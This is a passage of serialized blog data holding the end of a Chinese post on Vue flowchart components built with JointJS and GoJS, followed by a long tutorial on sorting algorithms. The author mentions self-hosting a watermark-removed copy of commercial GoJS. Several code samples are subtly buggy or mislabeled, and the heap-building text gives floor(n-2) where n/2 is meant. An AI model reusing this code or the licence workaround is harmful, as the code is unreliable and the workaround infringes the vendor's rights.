{\n                // Add element\n\n                obj =map[parentId];\n                size = _this.getWidthandHeight(obj.text);\n                node =new Shape({id:parentId,size:size}).setText(obj.text);\n\n                if(obj.category&amp;&amp;obj.category.shapeStyle){\n                    node = node.setShapeStyle(obj.category.shapeStyle);\n                }\n                if(obj.category&amp;&amp;obj.category.textStyle){\n                    node = node.setTextStyle(obj.category.textStyle);\n                }\n\n                elements.push(node);\n\n                // Add links\n                adjacencyList[parentId].forEach(function(childId) {\n                    links.push(\n                        new Link().connect(parentId, childId)// .setLabelText(parentLabel + &#39;-&#39; + childLabel)                                         \n                    );\n                });\n            });\n\n            return elements.concat(links);\n        },\n        layout() {            \n            let cells = this.buildGraphFromAdjacencyList(this.graphData.edge);    \n            this.graph.resetCells(cells);\n            joint.layout.DirectedGraph.layout(this.graph, this.getLayoutOptions());\n        },\n    }\n}\n&lt;/script&gt;\n\n&lt;style&gt;\n#myholder {\n    border: 1px solid lightgray;\n    margin-bottom:20px;\n    padding-left:20px\n}\n.tip{\n  color:#9ACD32;\n  font-size:0.9em;\n  font-weight:bold;\n  padding:5px;\n}\n&lt;/style&gt;\n</code></pre>\n<p>这是我自己包装的代码地址：<a href=\"https://github.com/LRY1994/vue-lib/tree/master/src/components/process-joint\">https://github.com/LRY1994/vue-lib/tree/master/src/components/process-joint</a></p>\n<p>这个目前看来还算满意</p>\n<h3 id=\"jsplumb\">jsplumb</h3>\n<p>这个看了官网，不太友好，而且下载只有一个js文件，没有demo代码，不知如何下手</p>\n<h3 id=\"参考资料：\">参考资料：</h3>\n<p><a href=\"https://gojs.net/latest/samples/pageFlow.html\">https://gojs.net/latest/samples/pageFlow.html</a>\n<a href=\"http://www.daviddurman.com/assets/autolayout.js\">http://www.daviddurman.com/assets/autolayout.js</a>\n<a href=\"http://resources.jointjs.com/demos/layout\">http://resources.jointjs.com/demos/layout</a></p>\n<p>---------------------------------------------更新 2018/8/30----------------------------------------------------------\n经过一番实践，我觉得jointjs不好用了。\n不满意点：</p>\n<ol>\n<li>不能相对容器自动布局，都用的是死的像素，分辨率低的屏幕，部分图有些就看不见\n{% asset_img joint-error.png %}</li>\n<li>不能滚动鼠标自己缩小放大</li>\n<li>比较丑，也可能是我不会配色</li>\n</ol>\n<p>最终采用gojs,上面提到的问题解决方案是：把去掉水印的gojs放在自己的npm服务器上，这样就可以npm安装了！！！\n实践过程中遇到个问题</p>\n<pre><code class=\"language-html\">&lt;process-go style=&quot;height:250px&quot;  v-if=&quot;show&quot;  :model-data=&quot;dataObj.graph&quot; :category=&quot;category&quot;&gt; &lt;/process-go&gt;</code></pre>\n<p>像这样，用<code>v-if</code>反复切换，会报错<code>Cannot read property &#39;type&#39; of undefined     at Po (go.js?d976:1044)</code></p>\n<p>换成<code>v-show</code>就不会</p>\n<pre><code class=\"language-html\">&lt;process-go style=&quot;height:250px&quot;  v-show=&quot;show&quot;  :model-data=&quot;dataObj.graph&quot; :category=&quot;category&quot;&gt; &lt;/process-go&gt;</code></pre>\n<p>但是这样的前提是show初始化是true.如果初始化为false,没有报错，但是图呈现不出来。\n原因我猜测是：show初始化为false,组件高度为0，因为默认画布就是组件容器，所以画布高度变成0，图画不出。</p>\n<p>最后想出个方法。<code>v-if</code>和<code>v-show</code>结合一起使用，加上<code>$once</code>方法，代码：</p>\n<pre><code class=\"language-html\">&lt;process-go style=&quot;height:250px&quot; v-if=&quot;firstClick&quot; v-show=&quot;show&quot;  :model-data=&quot;dataObj.graph&quot; :category=&quot;category&quot;&gt; &lt;/process-go&gt;</code></pre>\n<pre><code class=\"language-javascript\">data(){\n    return{        \n        show:false,\n        firstClick:false,\n    }\n}\ncreated(){\n    this.init();\n    this.$once(&#39;firstClick&#39;,()=&gt;{\n        this.firstClick = true\n    })\n},\nmethods:{\n    init(){...},\n    look(){//用v-if切换会报错，只有第一次点击查看用v-if,其他用v-show\n        this.$emit(&#39;firstClick&#39;);\n        this.show = true;\n    }\n}</code></pre>\n<p>重新封装了一下gojs 地址：<a href=\"https://github.com/LRY1994/vue-lib/blob/master/src/components/process-go/index.vue\">https://github.com/LRY1994/vue-lib/blob/master/src/components/process-go/index.vue</a></p>\n","index":20},{"filePath":"post\\2018\\9\\8-sort.md","htmlPath":"/post/2018/9/8-sort.html","name":"8-sort.md","type":"md","title":"八大排序算法、KMP","date":"2018/9/8","categories":"Collection","tags":"面经","html":"<p> {%asset_img 8-sort.png%}</p>\n<p>当n较大，则应采用时间复杂度为O(nlog2n)的排序方法：快速排序、堆排序或归并排序。</p>\n<p>快速排序：是目前基于比较的内部排序中被认为是最好的方法，当待排序的关键字是随机分布时，快速排序的平均时间最短；</p>\n<h2 id=\"插入排序直接插入排序straight-insertion-sort\">插入排序—直接插入排序(Straight Insertion Sort)</h2>\n<p>时间复杂度：O（n^2）稳定</p>\n<h4 id=\"基本思想\">基本思想:</h4>\n<p>每个元素向前找到属于自己的位置，后面元素后移.</p>\n<p>将一个记录插入到已排序好的有序表中，从而得到一个新，记录数增1的&gt;有序表。即：先将序列的第1个记录看成是一个有序的子序列，然后从第&gt;2个记录逐个进行插入，直至整个序列有序为止。</p>\n<p>要点：设立哨兵，作为临时存储和判断数组边界之用。</p>\n<p>直接插入排序示例：\n {%asset_img insert_sort.png%}</p>\n<p>如果碰见一个和插入元素相等的，那么插入元素把想插入的元素放在相等元素的后面。所以，相等元素的前后顺序没有改变，从原无序序列出去的顺序就是排好序后的顺序，所以插入排序是<code>稳定</code>的。</p>\n<h4 id=\"算法的实现：\">算法的实现：</h4>\n<pre><code class=\"language-js\">function InsertSort(a) \n{ \nfor(let i= 1; i&lt;a.length; i++){ \n    if(a[i] &lt; a[i-1]){ //若第i个元素大于i-1元素，直接插入。小于的话，移动有序表后插入  \n        let x = a[i]; //复制为哨兵，即存储待排序元素 \n        a[i] = a[i-1]; //先后移一个元素 \n\n        let j= i-1; \n        while(j&gt;=0&amp;&amp;x &lt; a[j]){ //查找在有序表的插入位置 \n            a[j+1] = a[j]; \n            j--; //元素后移 ,这里减多了一次\n        } \n        a[j+1] = x; //插入到正确位置 ,记得j+1\n    } \n    } \n\n} \na=[3,1,5,7,2,4,9,6]\nInsertSort(a) </code></pre>\n<p>其他的插入排序有二分插入排序，2-路插入排序。</p>\n<h2 id=\"插入排序希尔排序（shells-sort）\">插入排序—希尔排序（Shell`s Sort）</h2>\n<p>希尔排序是1959 年由D.L.Shell 提出来的，相对直接排序有较大的改进。希尔排序又叫缩小增量排序</p>\n<h4 id=\"基本思想：\">基本思想：</h4>\n<p>先将整个待排序的记录序列分割成为若干子序列分别进行直接插入排序，待整个序列中的记录“基本有序”时，再对全体记录进行依次直接插入排序。</p>\n<h4 id=\"操作方法：\">操作方法：</h4>\n<p>1.选择一个增量序列t1，t2，…，tk，其中ti&gt;tj，tk=1；\n2.按增量序列个数k，对序列进行k 趟排序；\n3.每趟排序，根据对应的增量ti，将待排序列分割成若干长度为m 的子序列，分别对各子表进行直接插入排序。仅增量因子为1 时，整个序列作为一个表来处理，表长度即为整个序列的长度。</p>\n<p>希尔排序的示例：\n {%asset_img shell_sort.png%}</p>\n<h4 id=\"算法实现：\">算法实现：</h4>\n<p>我们简单处理增量序列：增量序列d = {n/2 ,n/4, n/8 .....1} n为要排序数的个数</p>\n<p>即：先将要排序的一组记录按某个增量d（n/2,n为要排序数的个数）分成若干组子序列，每组中记录的下标相差d.对每组中全部元素进行直接插入排序，然后再用一个较小的增量（d/2）对它进行分组，在每组中再进行直接插入排序。继续不断缩小增量直至为1，最后使用直接插入排序完成排序。</p>\n<pre><code class=\"language-js\">\nfunction ShellInsertSort(a, dk) \n{ \nfor(let i= dk; i&lt;a.length; ++i){ \n    if(a[i] &lt; a[i-dk]){ //若第i个元素大于i-1元素，直接插入。小于的话，移动有序表后插入 \n        let j = i-dk; \n        let x = a[i]; //复制为哨兵，即存储待排序元素 \n        a[i] = a[i-dk]; //首先后移一个元素 \n        while(x &lt; a[j]){ //查找在有序表的插入位置 \n            a[j+dk] = a[j]; \n            j -= dk; //元素后移 \n        } \n        a[j+dk] = x; //插入到正确位置 \n    } \n} \n\n} \n\nfunction shellSort(a){ \n    let len = a.length;\n    let dk = len/2; \n    while( dk &gt;= 1 ){ \n        ShellInsertSort(a, dk); \n        dk = dk/2; \n    } \n} \n\n a= [3,1,5,7,2,4,9,6]; \n//ShellInsertSort(a,8,1); //直接插入排序 \nshellSort(a,8); //希尔插入排序 \n</code></pre>\n<h4 id=\"分析\">分析</h4>\n<p>希尔排序时效分析很难，关键码的比较次数与记录移动次数依赖于增量因子序列d的选取，特定情况下可以准确估算出关键码的比较次数和记录的移动次数。目前还没有人给出选取最好的增量因子序列的方法。增量因子序列可以有各种取法，有取奇数的，也有取质数的，但需要注意：增量因子中除1 外没有公因子，且最后一个增量因子必须为1。希尔排序方法是一个不稳定的排序方法。</p>\n<h2 id=\"选择排序简单选择排序（simple-selection-sort）\">选择排序—简单选择排序（Simple Selection Sort）</h2>\n<h4 id=\"基本思想：-1\">基本思想：</h4>\n<p>在要排序的一组数中，选出最小（或者最大）的一个数与第1个位置的数交换；然后在剩下的数当中再找最小（或者最大）的与第2个位置的数交换，依次类推，直到第n-1个元素（倒数第二个数）和第n个元素（最后一个数）比较为止。</p>\n<p>简单选择排序的示例：\n{%asset_img select_sort.png%}</p>\n<h4 id=\"操作方法：-1\">操作方法：</h4>\n<p>第一趟，从n 个记录中找出关键码最小的记录与第一个记录交换；\n第二趟，从第二个记录开始的n-1 个记录中再选出关键码最小的记录与第二个记录交换；\n以此类推.....\n第i 趟，则从第i 个记录开始的n-i+1 个记录中选出关键码最小的记录与第i 个记录交换，\n直到整个序列按关键码有序。</p>\n<h4 id=\"算法实现：-1\">算法实现：</h4>\n<pre><code class=\"language-js\">function SelectMinKey(a,start) \n{ \nlet k = start; \nfor(let j=start+1 ;j&lt;a.length; ++j) { \n    if(a[k] &gt; a[j]) k = j; \n} \nreturn k; \n} \n\nfunction selectSort(a){ \n    let key, tmp; \n    for(let i = 0; i&lt; a.length; ++i) { \n        key = SelectMinKey(a,i); //选择最小的元素 \n        if(key != i){ \n        tmp = a[i]; a[i] = a[key]; a[key] = tmp; //最小元素与第i位置元素互换 \n        } \n    } \n} \n\na = [3,1,5,7,2,4,9,6]; \nselectSort(a, 8); \n</code></pre>\n<p>简单选择排序的改进——<code>二元选择排序</code></p>\n<p>简单选择排序，每趟循环只能确定一个元素排序后的定位。我们可以考虑改进为每趟循环确定两个元素（当前趟最大和最小记录）的位置,从而减少排序所需的循环次数。改进后对n个数据进行排序，最多只需进行[n/2]趟循环即可。具体实现如下：</p>\n<pre><code class=\"language-js\">void SelectSort(int r[],int n) { \nint i ,j , min ,max, tmp; \nfor (i=1 ;i &lt;= n/2;i++) { \n// 做不超过n/2趟选择排序 \n    min = i; max = i ; //分别记录最大和最小关键字记录位置 \n    for (j= i+1; j&lt;= n-i; j++) { \n        if (r[j] &gt; r[max]) { \n            max = j ; continue ; \n        } \n        if (r[j]&lt; r[min]) { \n            min = j ; \n        } \n    } \n    //该交换操作还可分情况讨论以提高效率 \n    tmp = r[i-1]; r[i-1] = r[min]; r[min] = tmp; \n    tmp = r[n-i]; r[n-i] = r[max]; r[max] = tmp; \n\n    } \n} </code></pre>\n<h2 id=\"选择排序堆排序（heap-sort）\">选择排序—堆排序（Heap Sort）</h2>\n<p>堆排序是一种树形选择排序，是对直接选择排序的有效改进。</p>\n<h4 id=\"基本思想：-2\">基本思想：</h4>\n<p>堆排序的基本思想是：将待排序序列构造成一个<strong>大顶堆</strong>，此时，整个序列的最大值就是堆顶的根节点。<strong>将其与末尾元素进行交换，此时末尾就为最大值</strong>。然后将剩余n-1个元素重新构造成一个堆，这样会得到n个元素的次小值。如此反复执行，便能得到一个有序序列了</p>\n<p>因此，实现堆排序需解决两个问题：</p>\n<ol>\n<li>建堆。 如何将n 个待排序的数建成堆；</li>\n<li>调整堆。输出堆顶元素后，怎样调整剩余n-1 个元素，使其成为一个新堆。</li>\n</ol>\n<p>首先讨论第二个问题：输出堆顶元素后，对剩余n-1元素重新建成堆的调整过程。</p>\n<h4 id=\"调整小顶堆的方法：\">调整小顶堆的方法：</h4>\n<p>1）设有m 个元素的堆，输出堆顶元素后，剩下m-1 个元素。将堆底元素送入堆顶（（最后一个元素与堆顶进行交换），堆被破坏，其原因仅是根结点不满足堆的性质。</p>\n<p>2）将根结点与左、右子树中<code>**较小**</code>元素的进行交换。</p>\n<p>3）若与左子树交换：如果左子树堆被破坏，即左子树的根结点不满足堆的性质，则重复方法 （2）.</p>\n<p>4）若与右子树交换，如果右子树堆被破坏，即右子树的根结点不满足堆的性质。则重复方法 （2）.</p>\n<p>5）继续对不满足堆性质的子树进行上述交换操作，直到叶子结点，堆被建成。</p>\n<p>称这个自根结点到叶子结点的调整过程为筛选。如图：\n{%asset_img heap_sort_1.png%}</p>\n<p>再讨论对n 个元素初始建堆的过程。</p>\n<h4 id=\"建堆方法：\">建堆方法：</h4>\n<p>对初始序列建堆的过程，就是一个反复进行筛选的过程。</p>\n<p>1）n 个结点的完全二叉树，则最后一个结点是第 <code>floor(n-2)</code>个结点的子树。</p>\n<p>2）筛选从第<code>floor(n-2)</code>个结点为根的子树开始，该子树成为堆。</p>\n<p>3）之后向前依次对各结点为根的子树进行筛选，使之成为堆，直到根结点。</p>\n<p>如图建堆初始过程：无序序列：（49，38，65，97，76，13，27，49）\n {%asset_img heap_sort_2.png%}</p>\n<h4 id=\"算法的实现：-1\">算法的实现：</h4>\n<p>从算法描述来看，堆排序需要两个过程，一是建立堆，二是堆顶与堆的最后一个元素交换位置。所以堆排序有两个函数组成。一是建堆的渗透函数，二是反复调用渗透函数实现排序的函数。</p>\n<pre><code class=\"language-js\">/* 排序思路：（升序）\n * 将堆根保存于尾部，并对剩余序列调用调整函数，调整完成后，再将最大跟保存于尾部-1（-1，-2，...，-i），\n * 再对剩余序列进行调整，反复进行该过程，直至排序完成。\n */\n\n/* 将最大的元素调整到堆顶*/\nfunction AdjustHeap(arr, pos, len){\n    let swap = arr[pos];      //保存当前节点\n    let child = pos * 2 + 1;  //定位到当前节点的左边的子节点\n    while(child &lt; len){       //递归遍历所有的子节点\n        //判断当前节点是否有右节点，若右节点较大，就采用右节点和当前节点进行比较\n        if(child + 1 &lt; len &amp;&amp; arr[child] &lt; arr[child + 1]){\n            child += 1;\n        }\n        //比较当前节点和最大的子节点，小于就交换，交换后将当前节点定位到子节点上\n        if(arr[pos] &lt; arr[child]){          \n            arr[pos]=arr[child];        \n            pos = child;\n            child = pos * 2 + 1;\n        }\n        else{\n            break;\n        }\n        arr[pos] = swap;\n\n    }\n}\n\n/* 构建堆：\n * 满足：树中任一非叶子结点的关键字均不大于（或不小于）其左右孩子结点的关键字。\n * 实现：从最后一个拥有子节点的节点开始，将该节点和其他节点进行比较，将最大的数交换给该节点，\n *      交换后再依次向前节点进行相同的交换处理，直到构建出大顶堆。\n */\nfunction BuildHeap(arr){\n    let len =arr.length;\n    let n= Math.floor((len-1)/2);\n\n    for(let i=n; i&gt;=0; i--){  //构建大顶堆\n        AdjustHeap(arr, i, arr.length);//从第一个非叶子结点从下至上，从右至左调整结构\n    } \n}\n\n/*堆排序算法*/\nfunction HeapSort(arr){\n    BuildHeap(arr); //构建堆\n    for(let i=arr.length-1; i&gt;0; i--){   //从数组的尾部进行调整\n        let swap = arr[i];  //堆顶永远是最大的元素,将堆顶和尾部元素交换，最大元素就保存在尾部，并且不参与后面的调整\n        arr[i] = arr[0];\n        arr[0] = swap;\n        AdjustHeap(arr, 0, i); //重新对堆进行调整\n    }\n}\n\nvar arr = [46,12,33,72,68,19,80,33,1];\nvar arr = [46,12,33,72,68,19,80,33];\n\nconsole.log(&#39;before: &#39; + arr);\nHeapSort(arr);\nconsole.log(&#39; after: &#39; + arr);\n\n\n</code></pre>\n<p>分析:\n堆排序是一种选择排序，整体主要由构建初始堆+交换堆顶元素和末尾元素并重建堆两部分组成。其中构建初始堆经推导复杂度为O(n)，在交换并重建堆的过程中，需交换n-1次，而重建堆的过程中，根据完全二叉树的性质，[log2(n-1),log2(n-2)...1]逐步递减，近似为nlogn。所以堆排序时间复杂度一般认为就是O(nlogn)级。</p>\n<p>设树深度为k，k=floor(logn)+1 。从根到叶的筛选，元素比较次数至多2(k-1)次，交换记录至多k 次。所以，在建好堆后，排序过程中的筛选次数不超过下式：\n {%asset_img heap_sort_3.png%}\n而建堆时的比较次数不超过4n 次，因此堆排序最坏情况下，时间复杂度也为：O(nlogn )。</p>\n<h2 id=\"交换排序冒泡排序（bubble-sort）（下沉）\">交换排序—冒泡排序（Bubble Sort）（下沉）</h2>\n<h4 id=\"基本思想：-3\">基本思想：</h4>\n<p>在要排序的一组数中，对当前还未排好序的范围内的全部数，自上而下对相邻的两个数依次进行比较和调整，让较大的数往下沉，较小的往上冒。即：每当两相邻的数比较后发现它们的排序与排序要求相反时，就将它们互换。</p>\n<p>冒泡排序的示例：\n{%asset_img bubble_sort.png%}</p>\n<h4 id=\"算法的实现：-2\">算法的实现：</h4>\n<pre><code class=\"language-js\">void bubbleSort(int a[], int n){ \nfor(int i =0 ; i&lt; n-1; ++i) { //i只是次数\n    for(int j = 0; j &lt; n-i-1; ++j) { \n        if(a[j] &gt; a[j+1]) { \n        int tmp = a[j] ;\n         a[j] = a[j+1] ; \n         a[j+1] = tmp; \n        } \n    } \n} \n} </code></pre>\n<h4 id=\"冒泡排序算法的改进\">冒泡排序算法的改进</h4>\n<p>对冒泡排序常见的改进方法是加入一标志性变量<code>exchange</code>，用于标志某一趟排序过程中是否有数据交换，如果进行某一趟排序时并没有进行数据交换，则说明数据已经按要求排列好，可立即结束排序，避免不必要的比较过程。本文再提供以下两种改进算法：</p>\n<ol>\n<li>设置一标志性变量pos,用于记录每趟排序中最后一次进行交换的位置。由于<strong>pos位置之后的记录均已交换到位</strong>,故在进行下一趟排序时只要扫描到pos位置即可。</li>\n</ol>\n<p>改进后算法如下:</p>\n<pre><code class=\"language-js\">void Bubble_1 ( int r[], int n) { \nint i= n -1; //初始时,最后位置保持不变 \nwhile ( i&gt; 0) { \n    int pos= 0; //每趟开始时,无记录交换 \n    for (int j= 0; j&lt; i; j++) \n    if (r[j]&gt; r[j+1]) { \n        pos= j; //记录交换的位置 \n        int tmp = r[j]; r[j]=r[j+1];r[j+1]=tmp; \n    } \n    i= pos; //为下一趟排序作准备 \n} \n} </code></pre>\n<ol start=\"2\">\n<li>传统冒泡排序中每一趟排序操作只能找到一个最大值或最小值,我们考虑利用在每趟排序中进行正向和反向两遍冒泡的方法一次可以得到两个最终值(最大者和最小者) , 从而使排序趟数几乎减少了一半。</li>\n</ol>\n<p>改进后的算法实现为:</p>\n<pre><code class=\"language-js\">void Bubble_2 ( int r[], int n){ \n    int low = 0; \n    int high= n -1; //设置变量的初始值 \n    int tmp,j; \n    while (low &lt; high) { \n        for (j= low; j&lt; high; ++j){ //正向冒泡,找到最大者 \n            if (r[j]&gt; r[j+1]) { \n            tmp = r[j]; r[j]=r[j+1];r[j+1]=tmp; \n            } \n        }\n        --high; //修改high值, 前移一位 \n\n        for ( j=high; j&gt;low; --j){ //反向冒泡,找到最小者 \n            if (r[j]&lt;r[j-1]) { \n                tmp = r[j]; r[j]=r[j-1];r[j-1]=tmp; \n            } \n        }\n        ++low; //修改low值,后移一位 \n\n    } \n} </code></pre>\n<h2 id=\"交换排序快速排序（quick-sort）\">交换排序—快速排序（Quick Sort）</h2>\n<h4 id=\"基本思想：-4\">基本思想：</h4>\n<pre><code>1）选择一个基准元素,通常选择第一个元素或者最后一个元素。\n2）通过一趟排序将待排序的记录分割成独立的两部分，其中一部分记录的元素值均比基准元素值小。另一部分记录的 元素值比基准值大。\n3）此时基准元素在其排好序后的正确位置。\n4）然后分别对这两部分记录用同样的方法继续进行排序，直到整个序列有序。</code></pre><p>快速排序的示例：</p>\n<p>（a）一趟排序的过程：\n {%asset_img bubble_sort_1.png%}</p>\n<p>（b）排序的全过程\n  {%asset_img bubble_sort_2.png%}</p>\n<p>{%asset_img quick_sort.png%}</p>\n<h4 id=\"算法的实现：-3\">算法的实现：</h4>\n<pre><code class=\"language-js\">\nfunction swap(s,t) { \n    let tmp = a[s];\n    a[s]=a[t];\n    a[t]=tmp; \n} \n\nfunction partition(a,low, high) { \n    let privotIndex=low;\n    let privotKey = a[low]; //基准元素 \n    while(low &lt; high){ //从表的两端交替地向中间扫描 \n        while(low &lt; high &amp;&amp; a[high] &gt;= privotKey) --high; \n        while(low &lt; high &amp;&amp; a[low] &lt;= privotKey ) ++low; \n        if(low &lt; high) swap(low, high); \n    } \n    swap(low,privotIndex)\n    return low; //这里low和high相等\n} \n\n\nfunction quickSort(a, low, high){ \n    if(low &lt; high){ \n        let privotLoc = partition(a, low, high); //将表一分为二 \n        quickSort(a, low, privotLoc -1); //递归对低子表递归排序 \n        quickSort(a, privotLoc + 1, high); //递归对高子表递归排序 \n    } else{\n        return\n    }\n} \n\n\n a= [3,1,5,7,2,4,9,6,10,8]; \nquickSort(a,0,a.length-1); \n</code></pre>\n<h4 id=\"分析-1\">分析</h4>\n<p>快速排序是通常被认为在同数量级（O(nlog2n)）的排序方法中平均性能最好的。但若初始序列按关键码有序或基本有序时，快排序反而蜕化为冒泡排序。为改进之，通常以“三者取中法”来选取基准记录，即将排序区间的两个端点与中点三个记录关键码居中的调整为支点记录。快速排序是一个<code>不稳定</code>的排序方法。</p>\n<h4 id=\"快速排序的改进\">快速排序的改进</h4>\n<p>在本改进算法中,只对长度大于k的子序列递归调用快速排序,让原序列基本有序，然后再对整个基本有序序列用插入排序算法排序。实践证明，改进后的算法时间复杂度有所降低，且当k取值为 8 左右时,改进算法的性能最佳。算法思想如下：</p>\n<pre><code class=\"language-js\">void print(int a[], int n){ \nfor(int j= 0; j&lt;n; j++){ \ncout&lt;&lt;a[j] &lt;&lt;&quot; &quot;; \n} \ncout&lt;&lt;endl; \n} \n\nvoid swap(int *a, int *b) \n{ \nint tmp = *a; \n*a = *b; \n*b = tmp; \n} \n\nint partition(int a[], int low, int high) { \n    int privotKey = a[low]; //基准元素 \n    while(low &lt; high){ //从表的两端交替地向中间扫描 \n        while(low &lt; high &amp;&amp; a[high] &gt;= privotKey) --high; //从high 所指位置向前搜索，至多到low+1 位置。将比基准元素小的交换到低端 \n        swap(&amp;a[low], &amp;a[high]); \n        while(low &lt; high &amp;&amp; a[low] &lt;= privotKey ) ++low; \n        swap(&amp;a[low], &amp;a[high]); \n    } \n    print(a,10); \n    return low; \n} \n\n\nvoid qsort_improve(int r[ ],int low,int high, int k){ \n    if( high -low &gt; k ) { //长度大于k时递归, k为指定的数 \n        int pivot = partition(r, low, high); // 调用的Partition算法保持不变 \n        qsort_improve(r, low, pivot - 1,k); \n        qsort_improve(r, pivot + 1, high,k); \n    } \n} \nvoid quickSort(int r[], int n, int k){ \n    qsort_improve(r,0,n,k);//先调用改进算法Qsort使之基本有序 \n\n    //再用插入排序对基本有序序列排序 \n    for(int i=1; i&lt;=n;i ++){ \n        int tmp = r[i]; \n        int j=i-1; \n        while(tmp &lt; r[j]){ \n            r[j+1]=r[j]; j=j-1; \n        } \n        r[j+1] = tmp; \n    } \n} \nint main(){ \nint a[10] = {3,1,5,7,2,4,9,6,10,8}; \ncout&lt;&lt;&quot;初始值：&quot;; \nprint(a,10); \nquickSort(a,9,4); \ncout&lt;&lt;&quot;结果：&quot;; \nprint(a,10); \n\n} </code></pre>\n<h2 id=\"归并排序（merge-sort）\">归并排序（Merge Sort）</h2>\n<h4 id=\"基本思想：-5\">基本思想：</h4>\n<p>归并（Merge）排序法是将两个（或两个以上）有序表合并成一个新的有序表，即把待排序序列分为若干个子序列，每个子序列是有序的。然后再把有序子序列合并为整体有序序列。</p>\n<p>归并排序示例：\n {%asset_img merge_sort.png%}</p>\n<p> {%asset_img merge_sort2.png%}</p>\n<pre><code class=\"language-js\">\nfunction merge(left, right) {\n  var tmp = [];\n\n  while (left.length &amp;&amp; right.length) {\n    if (left[0] &lt; right[0])\n      tmp.push(left.shift());\n    else\n      tmp.push(right.shift());\n  }\n\n  return tmp.concat(left, right);\n}\n\nfunction mergeSort(a) {\n  if (a.length === 1) \n    return a;\n\n  var mid = ~~(a.length / 2)\n    , left = a.slice(0, mid)\n    , right = a.slice(mid);\n\n  return merge(mergeSort(left), mergeSort(right));\n} </code></pre>\n<p>这段合并排序的代码相当简单直观，但是mergeSort()函数会导致很频繁的自调用。一个长度为n的数组最终会调用mergeSort() 2*n-1次，这意味着如果需要排序的数组长度很大会在某些栈小的浏览器上发生栈溢出错误。</p>\n<p>这里插个话题，关于递归调用时浏览器的栈大小限制，可以用代码去测试：</p>\n<pre><code class=\"language-js\">var cnt = 0;\ntry {\n  (function() {\n    cnt++;\n    arguments.callee();\n  })();\n} catch(e) {\n  console.log(e.message, cnt);\n}\n\n\n// chrome: Maximum call stack size exceeded 35992\n// firefox: too much recursion 11953</code></pre>\n<p>遇到栈溢出错误并不一定要修改整个算法，只是表明递归不是最好的实现方式。这个合并排序算法同样可以迭代实现，比如（摘抄自《高性能JavaScript》）：</p>\n<h4 id=\"归并的迭代算法\">归并的迭代算法</h4>\n<p>1个元素的表总是有序的。所以对n 个元素的待排序列，每个元素可看成1 个有序子表。对子表两两合并生成n/2个子表，所得子表除最后一个子表长度可能为1 外，其余子表长度均为2。再进行两两合并，直到生成n 个元素按关键码有序的表。</p>\n<pre><code class=\"language-js\">function merge(left, right) {\n  var result = [];\n\n  while (left.length &amp;&amp; right.length) {\n    if (left[0] &lt; right[0])\n      result.push(left.shift());\n    else\n      result.push(right.shift());\n  }\n\n  return result.concat(left, right);\n}\n\nfunction mergeSort(a) {\n  if (a.length === 1)\n    return a;\n\n  var work = [];\n  for (var i = 0, len = a.length; i &lt; len; i++)\n    work.push([a[i]]);\n\n  work.push([]); // 如果数组长度为奇数!!\n\n  for (var lim = len; lim &gt; 1; lim = ~~((lim + 1) / 2)) {\n    for (var j = 0, k = 0; k &lt; lim; j++, k += 2) //k &lt; lim\n      work[j] = merge(work[k], work[k + 1]);\n\n    work[j] = []; // 如果数组长度为奇数!!\n  }\n\n  return work[0];\n}\n\nconsole.log(mergeSort([1, 3, 4, 2, 5, 0, 8, 10, 4])); </code></pre>\n<h4 id=\"两路归并的递归算法\">两路归并的递归算法</h4>\n<pre><code class=\"language-js\">void MSort(ElemType *r, ElemType *rf,int s, int t) \n{ \nElemType *rf2; \nif(s==t) r[s] = rf[s]; \nelse \n{ \n    int m=(s+t)/2; /*平分*p 表*/ \n    MSort(r, rf2, s, m); /*递归地将p[s…m]归并为有序的p2[s…m]*/ \n    MSort(r, rf2, m+1, t); /*递归地将p[m+1…t]归并为有序的p2[m+1…t]*/ \n    Merge(rf2, rf, s, m+1,t); /*将p2[s…m]和p2[m+1…t]归并到p1[s…t]*/ \n} \n} \nvoid MergeSort_recursive(ElemType *r, ElemType *rf, int n) \n{ /*对顺序表*p 作归并排序*/ \n    MSort(r, rf,0, n-1); \n} </code></pre>\n<h2 id=\"桶排序基数排序radix-sort\">桶排序/基数排序(Radix Sort)</h2>\n<h3 id=\"桶排序\">桶排序</h3>\n<h4 id=\"基本思想-1\">基本思想</h4>\n<p>是将阵列分到有限数量的桶子里。每个桶子再个别排序（有可能再使用别的排序算法或是以递回方式继续使用桶排序进行排序）。桶排序是鸽巢排序的一种归纳结果。当要被排序的阵列内的数值是均匀分配的时候，桶排序使用线性时间（Θ（n））。但桶排序并不是 比较排序，他不受到 O(n log n) 下限的影响。</p>\n<p>简单来说，就是把数据分组，放在一个个的桶中，然后对每个桶里面的在进行排序。</p>\n<p>例如要对大小为[1..1000]范围内的n个整数A[1..n]排序</p>\n<p>首先，可以把桶设为大小为10的范围，具体而言，设集合B[1]存储[1..10]的整数，集合B[2]存储 (10..20]的整数，……集合B[i]存储( (i-1)<em>10, i</em>10]的整数，i = 1,2,..100。总共有 100个桶。</p>\n<p>然后，对A[1..n]从头到尾扫描一遍，把每个A[i]放入对应的桶B[j]中。 再对这100个桶中每个桶里的数字排序，这时可用冒泡，选择，乃至快排，一般来说任 何排序法都可以。</p>\n<p>最后，依次输出每个桶里面的数字，且每个桶中的数字从小到大输出，这 样就得到所有数字排好序的一个序列了。</p>\n<p>假设有n个数字，有m个桶，如果数字是平均分布的，则每个桶里面平均有n/m个数字。如果对每个桶中的数字采用快速排序，那么整个算法的复杂度是 O(n + m * n/m*log(n/m)) = O(n + nlogn - nlogm) 从上式看出，当m接近n的时候，桶排序复杂度接近O(n)</p>\n<p>当然，以上复杂度的计算是基于输入的n个数字是平均分布这个假设的。这个假设是很强的 ，实际应用中效果并没有这么好。如果所有的数字都落在同一个桶中，那就退化成一般的排序了。</p>\n<p>前面说的几大排序算法 ，大部分时间复杂度都是O（n2），也有部分排序算法时间复杂度是O(nlogn)。而桶式排序却能实现O（n）的时间复杂度。</p>\n<p>但桶排序的缺点是：</p>\n<p>1）首先是空间复杂度比较高，需要的额外开销大。排序有两个数组的空间开销，一个存放待排序数组，一个就是所谓的桶，比如待排序值是从0到m-1，那就需要m个桶，这个桶数组就要至少m个空间。</p>\n<p>2）其次待排序的元素都要在一定的范围内等等。</p>\n<p>桶式排序是一种分配排序。分配排序的特定是不需要进行关键码的比较，但前提是要知道待排序列的一些具体情况。</p>\n<p>分配排序的基本思想：说白了就是进行多次的桶式排序。</p>\n<p>基数排序过程无须比较关键字，而是通过“分配”和“收集”过程来实现排序。它们的时间复杂度可达到线性阶：O(n)。</p>\n<p>实例:</p>\n<p>扑克牌中52 张牌，可按花色和面值分成两个字段，其大小关系为：\n {%asset_img tong_sort_1.png%}\n若对扑克牌按花色、面值进行升序排序，得到如下序列：\n 